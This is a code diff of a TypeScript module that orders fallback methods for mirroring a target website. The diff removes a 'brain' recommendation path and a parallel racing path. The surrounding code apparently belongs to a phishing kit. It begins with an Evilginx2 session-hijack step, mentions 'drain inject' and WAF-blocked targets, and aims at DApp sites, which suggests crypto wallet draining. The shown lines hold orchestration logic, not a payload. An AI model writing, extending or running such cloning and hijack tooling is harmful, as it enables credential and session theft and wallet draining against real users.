@@ -41,16 +41,6 @@ import {
   finalizeMirrorNginxConfig,
   sanitizeNginxConfig,
 } from './training-clone-features.js'
-import {
-  createParallelDirs,
-  discardLoser,
-  logParallelResult,
-  promoteWinnerToOutDir,
-  runParallelGenerators,
-  selectParallelPair,
-  shouldRunParallel,
-  toDeliveryMethod,
-} from './parallel-clone-executor.js'
 
 export type MirrorDeliveryMethod =
   | 'reverse-proxy'
@@ -78,15 +68,6 @@ export type RunCommandFn = (
   opts?: { cwd?: string; env?: NodeJS.ProcessEnv; timeoutMs?: number },
 ) => Promise<{ stdout: string; stderr: string }>
 
-export type BrainRecommendation = {
-  method: 'static' | 'proxy' | 'hybrid' | 'custom'
-  confidence: number
-  detectedType: string
-  predictedSuccessRate: number
-  issues: string[]
-  reasoning: string
-}
-
 export type MirrorFallbackChainOpts = {
   repoRoot: string
   outDir: string
@@ -99,8 +80,6 @@ export type MirrorFallbackChainOpts = {
   homepageHtml?: string
   runCommand: RunCommandFn
   generateTimeoutMs?: number
-  /** Phase 1: Brain recommendation from ClonePatternMatcher */
-  brainRecommendation?: BrainRecommendation
 }
 
 const DEFAULT_GENERATE_TIMEOUT_MS = 180_000
@@ -448,23 +427,6 @@ export async function runMirrorFallbackChain(
 
   const adapterCtx = { ...opts, wafBlocked: false }
 
-  // ── PHASE 1: Log brain recommendation at chain start ────────
-  if (opts.brainRecommendation && opts.brainRecommendation.confidence > 0) {
-    const rec = opts.brainRecommendation
-    const methodHint: Record<string, string> = {
-      static:  'static clone (no live data needed)',
-      proxy:   'reverse-proxy (real-time / security critical)',
-      hybrid:  'proxy then static fallback (balanced)',
-      custom:  'webcloner / headless (complex DApp)',
-    }
-    console.error(
-      `[brain→chain] Recommendation: ${rec.method.toUpperCase()} — ` +
-      `${methodHint[rec.method] ?? rec.method} (${rec.confidence}% confident)\n` +
-      `[brain→chain] Reordering fallback chain to try preferred method first`,
-    )
-  }
-  // ────────────────────────────────────────────────────────────
-
   // 0 — Session hijack (Evilginx2) — skips drain inject
   const hijack = await runSessionHijackAdapter(adapterCtx)
   if (hijack) {
@@ -472,170 +434,10 @@ export async function runMirrorFallbackChain(
     return hijack
   }
 
-  // ── PHASE 1: Brain-guided fast path ─────────────────────────
-  const brainMethod = opts.brainRecommendation?.method
-  const brainConf   = opts.brainRecommendation?.confidence ?? 0
-
-  // If brain is confident AND recommends static, skip straight to static clone
-  // (bypassing the slower reverse-proxy attempt that always runs first)
-  if (brainMethod === 'static' && brainConf >= 80) {
-    console.error(
-      '[brain→chain] High-confidence STATIC recommendation — attempting static clone first',
-    )
-    try {
-      await clearDockerMirrorArtifacts(opts.outDir, opts.runCommand)
-      await generateStaticCloneMirror(opts)
-      const dockerOk = await tryDockerMirrorStack(
-        opts.outDir,
-        opts.targetUrl,
-        opts.port,
-        opts.runCommand,
-      )
-      if (dockerOk) {
-        await writeMirrorMeta(opts.outDir, opts.targetUrl, 'static-clone', 'docker')
-        console.error('[brain→chain] Static clone (brain-guided) succeeded')
-        return { method: 'static-clone', stackMode: 'docker', errors }
-      }
-      const staticOk = await tryStaticServe(opts.outDir, opts.port)
-      if (staticOk) {
-        await writeMirrorMeta(opts.outDir, opts.targetUrl, 'static-clone', 'static')
-        console.error('[brain→chain] Static serve (brain-guided) succeeded')
-        return { method: 'static-clone', stackMode: 'static', errors }
-      }
-      errors.push('brain-static: docker/static-serve failed — falling through to normal chain')
-    } catch (e) {
-      const msg = e instanceof Error ? e.message : String(e)
-      errors.push(`brain-static: ${msg}`)
-      console.error(`[brain→chain] Brain-guided static failed: ${msg} — normal chain continues`)
-    }
-  }
-
-  // If brain recommends proxy/hybrid with high confidence, try reverse-proxy FIRST (already the default)
-  // If brain recommends custom/headless, log it and let the chain naturally reach webcloner/headless
-  if ((brainMethod === 'custom') && brainConf >= 75) {
-    console.error(
-      '[brain→chain] CUSTOM recommendation — skipping reverse-proxy, going straight to webcloner/headless',
-    )
-    // Will fall through to step 5-6 (webcloner/headless) naturally after steps 1-4 quick-fail
-    // We mark them as skipped here in errors to push chain forward
-    errors.push('brain-skip: reverse-proxy skipped (brain: custom DApp needs headless/webcloner)')
-    errors.push('brain-skip: static-clone skipped (brain: custom DApp)')
-  }
-  // ────────────────────────────────────────────────────────────
-
-  // ── PHASE 3: Parallel execution fast path ───────────────────────
-  // When brain confidence is ≥75%, race the top-2 recommended methods
-  // simultaneously.  First successful generation wins.  Docker/serve
-  // happens only for the winner so there are no port conflicts.
-  if (opts.brainRecommendation && shouldRunParallel(opts.brainRecommendation)) {
-    const pair = selectParallelPair(opts.brainRecommendation)
-    console.error(
-      `[parallel] Racing ${pair[0]} vs ${pair[1]} (brain: ${opts.brainRecommendation.method} @ ${opts.brainRecommendation.confidence}%)`,
-    )
-
-    try {
-      const [dir1, dir2] = await createParallelDirs(opts.outDir, pair)
-      const subOpts1: MirrorFallbackChainOpts = { ...opts, outDir: dir1 }
-      const subOpts2: MirrorFallbackChainOpts = { ...opts, outDir: dir2 }
-
-      // Build generator functions for each method
-      const genFor = (method: typeof pair[0], subOpts: MirrorFallbackChainOpts): () => Promise<boolean> => {
-        switch (method) {
-          case 'reverse-proxy':
-            return async () => {
-              try {
-                await clearDockerMirrorArtifacts(subOpts.outDir, subOpts.runCommand)
-                await generateReverseProxyMirror(subOpts)
-                return true
-              } catch { return false }
-            }
-          case 'static-clone':
-            return async () => {
-              try {
-                await clearDockerMirrorArtifacts(subOpts.outDir, subOpts.runCommand)
-                await generateStaticCloneMirror(subOpts)
-                return true
-              } catch { return false }
-            }
-          case 'headless-capture':
-            return async () => {
-              try {
-                const captured = await import('./mirror-headless-capture.js').then(
-                  (m) => m.captureMirrorWithHeadless(subOpts.targetUrl, subOpts.outDir),
-                )
-                return captured.ok
-              } catch { return false }
-            }
-        }
-      }
-
-      const race = await runParallelGenerators(
-        { method: pair[0], subDir: dir1, generate: genFor(pair[0], subOpts1) },
-        { method: pair[1], subDir: dir2, generate: genFor(pair[1], subOpts2) },
-      )
-
-      if (race) {
-        const { winner, loser, durationMs } = race
-        logParallelResult(winner.method, loser.method, durationMs)
-
-        // Promote winner artifacts to main outDir, cleanup loser
-        await promoteWinnerToOutDir(winner.subDir, opts.outDir)
-        discardLoser(loser.subDir).catch(() => {})
-
-        // Now serve the winner's artifacts
-        const winnerMethod = toDeliveryMethod(winner.method)
-        if (winner.method === 'reverse-proxy') {
-          const dockerOk = await tryDockerMirrorStack(opts.outDir, opts.targetUrl, opts.port, opts.runCommand)
-          if (dockerOk) {
-            await writeMirrorMeta(opts.outDir, opts.targetUrl, winnerMethod, 'docker', { parallel: true })
-            console.error(`[parallel] Serving: ${winnerMethod} (docker)`)
-            return { method: winnerMethod, stackMode: 'docker', errors }
-          }
-        } else if (winner.method === 'static-clone') {
-          const dockerOk = await tryDockerMirrorStack(opts.outDir, opts.targetUrl, opts.port, opts.runCommand)
-          if (dockerOk) {
-            await writeMirrorMeta(opts.outDir, opts.targetUrl, 'static-clone', 'docker', { parallel: true })
-            console.error('[parallel] Serving: static-clone (docker)')
-            return { method: 'static-clone', stackMode: 'docker', errors }
-          }
-          const staticOk = await tryStaticServe(opts.outDir, opts.port)
-          if (staticOk) {
-            await writeMirrorMeta(opts.outDir, opts.targetUrl, 'static-clone', 'static', { parallel: true })
-            console.error('[parallel] Serving: static-clone (static serve)')
-            return { method: 'static-clone', stackMode: 'static', errors }
-          }
-        } else if (winner.method === 'headless-capture') {
-          const staticOk = await tryStaticServe(opts.outDir, opts.port)
-          if (staticOk) {
-            await writeMirrorMeta(opts.outDir, opts.targetUrl, 'headless-capture', 'static', { parallel: true })
-            console.error('[parallel] Serving: headless-capture (static serve)')
-            return { method: 'headless-capture', stackMode: 'static', errors }
-          }
-        }
-
-        errors.push(`parallel: ${winnerMethod} generated OK but serve failed — falling through`)
-        console.error(`[parallel] Serve failed for winner ${winnerMethod} — sequential chain continues`)
-      } else {
-        errors.push('parallel: both methods failed — sequential chain continues')
-        console.error('[parallel] Both parallel attempts failed — sequential chain continues')
-      }
-    } catch (e) {
-      const msg = e instanceof Error ? e.message : String(e)
-      errors.push(`parallel: ${msg}`)
-      console.error(`[parallel] Race failed: ${msg} — sequential chain continues`)
-    }
-  }
-  // ────────────────────────────────────────────────────────────────
-
   console.error(
     '[clone-tunnel] Fallback chain: reverse-proxy → flaresolverr → static → asuka → webcloner → headless → placeholder',
   )
 
-  // Skip reverse-proxy for custom-recommended sites (brain already logged the skip above)
-  if (brainMethod === 'custom' && brainConf >= 75) {
-    errors.push('reverse-proxy: skipped (brain recommends custom/headless)')
-    console.error('[brain→chain] [1/8] Skipped reverse-proxy (brain: custom method)')
-  } else {
   // 1 — Reverse proxy (Replica optional, else nginx docker)
   try {
     console.error('[clone-tunnel] [1/8] Attempting reverse-proxy mirror…')
@@ -766,7 +568,6 @@ export async function runMirrorFallbackChain(
     errors.push(`asuka: ${msg}`)
     console.error(`[clone-tunnel] [4/8] Asuka failed: ${msg}`)
   }
-  } // end of non-custom brain path (else block for steps 1-4)
 
   // 5 — webcloner-js static clone
   if (isWebclonerEnabled()) {
